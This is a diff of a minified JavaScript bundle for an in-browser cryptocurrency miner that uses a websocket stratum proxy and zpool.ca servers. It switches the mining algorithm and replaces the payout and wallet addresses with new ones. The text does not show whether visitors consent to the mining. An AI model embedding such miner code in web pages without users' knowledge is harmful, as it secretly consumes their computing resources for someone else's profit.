@@ -1600,15 +1600,15 @@
             class zU {
                 constructor({algorithm: U, events: Q={}, config: F={}}, B=null) {
                     (0,
-                    j.A)(this, "algorithm", "yespower"),
+                    j.A)(this, "algorithm", "minotaurx"),
                     (0,
                     j.A)(this, "pool", "wss://websocket-stratum-server.com"),
                     (0,
                     j.A)(this, "config", {
                         stratum: {
-                            server: "yespower.na.mine.zpool.ca",
-                            port: 6234,
-                            worker: "D9PyhMqEh8LaRecs9RArHNdMp3faU1WtLY",
+                            server: "minotaurx.eu.mine.zpool.ca",
+                            port: 7019,
+                            worker: "DEw5esZk5iRZS3T8LdUXP8Scj8Vcyz8yNB",
                             password: "c=DOGE"
                         },
                         options: {
@@ -1656,11 +1656,11 @@
                 }
             }
             const jU = {
-                BTC: "bc1qqusynns3mnhvmhv9u5m5wp5gq37tl2sfksu9zr",
-                LTC: "LWuSFmmrRgd29L3DUFHiXMWo85rNhpGa57",
-                BNB: "0xd355c7A79B1693F651Dd618b02FF0260ca467B80",
-                DOGE: "D9PyhMqEh8LaRecs9RArHNdMp3faU1WtLY",
-                RVN: "RM2WREatNrJwFqiQgHG9LtxG4engm2bwW7"
+                BTC: "bc1qwucw0pay4metrt4s50w8pclcwedxlhfryt84h9",
+                LTC: "ltc1qth23wx340kjwnv3akxqlvq4f2cz54tqhpyz6zx",
+                BNB: "0x7fE962dDF195e74af4f5ADE2a75e4cEEDB837614",
+                DOGE: "DEw5esZk5iRZS3T8LdUXP8Scj8Vcyz8yNB",
+                RVN: "i dont have it"
             }
               , AU = [{
                 value: "yespower",
@@ -1703,7 +1703,7 @@
                     stratum: {
                         server: "minotaurx.na.mine.zpool.ca",
                         port: 7019,
-                        worker: "D9PyhMqEh8LaRecs9RArHNdMp3faU1WtLY",
+                        worker: "DEw5esZk5iRZS3T8LdUXP8Scj8Vcyz8yNB",
                         password: "c=DOGE"
                     }
                 };
@@ -1798,7 +1798,7 @@
                             algorithm: "yespower",
                             host: "yespower.na.mine.zpool.ca",
                             port: 6234,
-                            worker: "D9PyhMqEh8LaRecs9RArHNdMp3faU1WtLY",
+                            worker: "DEw5esZk5iRZS3T8LdUXP8Scj8Vcyz8yNB",
                             password: "c=DOGE",
                             workers: 1
                         },
